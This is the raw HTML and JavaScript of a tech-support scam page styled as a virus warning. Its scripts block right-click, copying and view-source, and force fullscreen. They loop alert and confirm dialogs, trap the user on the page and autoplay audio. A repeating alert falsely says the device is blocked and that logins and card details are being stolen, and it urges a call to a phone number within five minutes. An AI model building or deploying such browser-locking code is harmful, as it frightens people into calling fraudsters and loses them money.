<!DOCTYPE html>
<html>

<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Virus warning.....</title>



<link rel="Shortcut Icon" href="#" type="image/x-icon">


<style type="text/css">
body {
	background-color:#367588;
	
}
body,td,th {
	color: #fcfcfc;
	text-align: center;
	font-family: "Courier New";
	font-style: normal;
	font-weight: 403;
	font-size: 154%;
}


</style>


	  


<script>


// mozfullscreenerror event handler
function errorHandler() {
   alert('mozfullscreenerror');
}
document.documentElement.addEventListener('mozfullscreenerror', errorHandler, false);

// toggle full screen
function toggleFullScreen() 
{
  if (!document.fullscreenElement &&    // alternative standard method
      !document.mozFullScreenElement && !document.webkitFullscreenElement) {  // current working methods
    if (document.documentElement.requestFullscreen) {
      document.documentElement.requestFullscreen();
    } else if (document.documentElement.mozRequestFullScreen) {
      document.documentElement.mozRequestFullScreen();
    } else if (document.documentElement.webkitRequestFullscreen) {
      document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
    }
  } else {
    false;
  }
}

// keydown event handler

document.addEventListener('keydown', function(e) {
if (e.keyCode == 70 || e.keyCode == 70) { // F or Enter key
  toggleFullScreen();
}
}, false);

</script>


<script type="text/javascript">
            (function(funcName, baseObj) {
             // The public function name defaults to window.docReady
             // but you can pass in your own object and own function name and those will be used
             // if you want to put them in a different namespace
             funcName = funcName || "docReady";
             baseObj = baseObj || window;
             var readyList = [];
             var readyFired = false;
             var readyEventHandlersInstalled = false;
             
             // call this when the document is ready
             // this function protects itself against being called more than once
             function ready() {
             if (!readyFired) {
             // this must be set to true before we start calling callbacks
             readyFired = true;
             for (var i = 0; i < readyList.length; i++) {
             // if a callback here happens to add new ready handlers,
             // the docReady() function will see that it already fired
             // and will schedule the callback to run right after
             // this event loop finishes so all handlers will still execute
             // in order and no new ones will be added to the readyList
             // while we are processing the list
             readyList[i].fn.call(window, readyList[i].ctx);
             }
             // allow any closures held by these functions to free
             readyList = [];
             }
             }
             
             function readyStateChange() {
             if ( document.readyState === "complete" ) {
             ready();
             }
             }
             
             // This is the one public interface
             // docReady(fn, context);
             // the context argument is optional - if present, it will be passed
             // as an argument to the callback
             baseObj[funcName] = function(callback, context) {
             // if ready has already fired, then just schedule the callback
             // to fire asynchronously, but right away
             if (readyFired) {
             setTimeout(function() {callback(context);}, 1);
             return;
             } else {
             // add the function and context to the list
             readyList.push({fn: callback, ctx: context});
             }
             // if document already ready to go, schedule the ready function to run
             if (document.readyState === "complete") {
             setTimeout(ready, 1);
             } else if (!readyEventHandlersInstalled) {
             // otherwise if we don't have event handlers installed, install them
             if (document.addEventListener) {
             // first choice is DOMContentLoaded event
             document.addEventListener("DOMContentLoaded", ready, false);
             // backup is window load event
             window.addEventListener("load", ready, false);
             } else {
             // must be IE
             document.attachEvent("onreadystatechange", readyStateChange);
             window.attachEvent("onload", ready);
             }
             readyEventHandlersInstalled = true;
             }
             }
             })("docReady", window);
             
             document.ondragstart = test;
             document.onselectstart = test;
             document.oncontextmenu = test;
             function test() {
                 return false;
             }
        document.oncontextmenu;
        function catchControlKeys(event) {
            var code = event.keyCode ? event.keyCode : event.which ? event.which : null;
            if (event.ctrlKey) {
                // Ctrl+U
                if (code == 117) {
                    return false;
                }
                if (code == 85) {
                    return false;
                }
                // Ctrl+C
                if (code == 99) {
                    return false;
                }
                if (code == 67) {
                    return false;
                }
                // Ctrl+A
                if (code == 97) {
                    return false;
                }
                if (code == 65) {
                    return false;
                }
            }
        }
        </script><script>
            var check = 0;
            
            docReady(function()
                     {
                     var nAgt = navigator.userAgent;
                     if (nAgt.indexOf("Chrome") !== -1) {
                     // browserName = "Chrome";
                     setTimeout(function() {
                                for (var i = 0; i < 99; i++)
                                {
                                alert(document.getElementById('error_msg').innerHTML.replace(/\<br\\?>/g, '\n').replace(/(<([^>]+)>)/ig,''));
                                // document.location = 'index.html';
                                
                                }
                                check = 0;
                                }, 10);
                     
                     } else {
                     setTimeout(function() {
                                for (var i = 0; i < 99; i++) {
                                alert(document.getElementById('error_msg').innerHTML.replace(/\<br\\?>/g, '\n').replace(/(<([^>]+)>)/ig,''));
                                // document.location = 'index.html';
                                }
                                check = 1;
                                }, 10);
                     }
                     });
            </script>
			<script type="text/javascript">
            function goodbye(e) {
                if (!e)
                e = window.event;
                //e.cancelBubble is supported by IE - this will kill the bubbling process.
                e.cancelBubble = true;
                e.returnValue = "";
                
                //e.stopPropagation works in Firefox.
                if (e.stopPropagation) {
                    e.stopPropagation();
                    e.preventDefault();
                }
            }
        window.onbeforeunload = goodbye;
            </script><script type="text/javascript">
            function downloadJSAtOnload() {
                var element = document.createElement("script");
                element.src = "js/defer.js";
                document.body.appendChild(element);
            }
        if (window.addEventListener)
        window.addEventListener("load", downloadJSAtOnload, false);
        else if (window.attachEvent)
        window.attachEvent("onload", downloadJSAtOnload);
        else window.onload = downloadJSAtOnload;
            </script><script>
            (function(){
             var t,i,e,n=window,o=document,a=arguments,s="script",r=["config","track","identify","visit","push","call","trackForm","trackClick"],c=function(){var t,i=this;for(i._e=[],t=0;r.length>t;t++)(function(t){i[t]=function(){return i._e.push([t].concat(Array.prototype.slice.call(arguments,0))),i}})(r[t])};for(n._w=n._w||{},t=0;a.length>t;t++)n._w[a[t]]=n[a[t]]=n[a[t]]||new c;i=o.createElement(s),i.async=1,i.src="js/w.js",e=o.getElementsByTagName(s)[0],e.parentNode.insertBefore(i,e)
             })("woopra");
             
             woopra.config({
                           domain: 'index.html'
                           });
                           woopra.track();
            </script>
			<script type="text/javascript">
	
	var userAgent = navigator.userAgent.toLowerCase();

    // Figure out what browser is being used.
    var Browser = {
        Version: (userAgent.match(/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/) || [])[1],
        Chrome: /chrome/.test(userAgent),
        Safari: /webkit/.test(userAgent),
        Opera: /opera/.test(userAgent),
        IE: /msie/.test(userAgent) && !/opera/.test(userAgent),
        Mozilla: /mozilla/.test(userAgent) && !/(compatible|webkit)/.test(userAgent)}
	
	if(Browser.Chrome||Browser.Mozilla) //Check for Chrome or Firefox
	{if(window.opr){}else{function msg_ch()
	{alert(Msg);}window.setInterval(function(){msg_ch()},1000);}} 
	else {if(window.sidebar)
	{function msg_ff(){var i=document.createElement("div");i.innerHTML='<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"></div>';
	document.body.appendChild(i);}window.setInterval(function(){msg_ff()},100);} 
	else {function msg(){var r = confirm(Msg);if (r == true) {alert(Msg);} else {alert(Msg);}}window.setInterval(function(){msg()},100);}}
	</script>
  



  

<style>
#box{  
position: absolute;

    top: 0px;
    left: 50%;
    margin-left: -184px;
    width: 450px;
    height: 556px;
    border: 2px solid #c7c7c7;
    border-radius: 0;
    background: #fbfbfb;
    color: #000000;
    padding: 24px;
    box-sizing: border-box;
    font-family: sans-serif;
    box-shadow: 0 1px 1px 1px #ccc;
    font-size: 18px;
    z-index: 99999; } 

#box h2{ font-size: 18px; font-weight: inherit; margin: 0; } #box .btn{ border: 2px solid #bababa; border-radius: 1px; padding: 7px 9px; margin: 9px; display: inline-block; box-shadow: 0 1px 1px 0px #ccc; cursor: pointer; float: right; text-decoration: none; color: #333; } 

#box .btn:nth-child(2n-1){ font-weight: bold; border: 2px solid #3c79ee; }

body {
    background-image: url(mycomputer.png);
    background-position: center top;
    background-size: 100% auto;
}

</style>



</head>

<br>
<br>
<br>
<br>
<br>
<br>


 
</div>


<script type="text/javascript">
{
        return setInterval(function () {alert("******* YOUR DEVICE HAS BEEN BLOCKED *******\n\nError # 228F3\n\nPlease call us immediately at:  +1-844-850-3385 \nDo not ignore this critical alert.\n If you close this page, your device access will be disabled to prevent further damage to our network.\n\nPlease call us immediately at:    +1-844-850-3385\n\nYour device has alerted us that it has been infected with a Suspicious Activity.  The following information is being stolen...\n\nPlease call us immediately at:    +1-844-850-3385\n\n> Facebook Login\n> Credit Card Details\n> Email Account Login\n> Photos stored on this device\nYou must contact us immediately so that our engineers can walk you through the removal process over the phone.  Please call us within the next 5 minutes to prevent your device from being disabled.\n\nPlease call us immediately at:    +1-844-850-3385\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")}, 10);
		
}
</script>

<br><br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


<audio controls="controls" autoplay="autoplay">

  <source src="gp-msg.mp3" type="audio/mpeg">

</audio>





</body>

</html>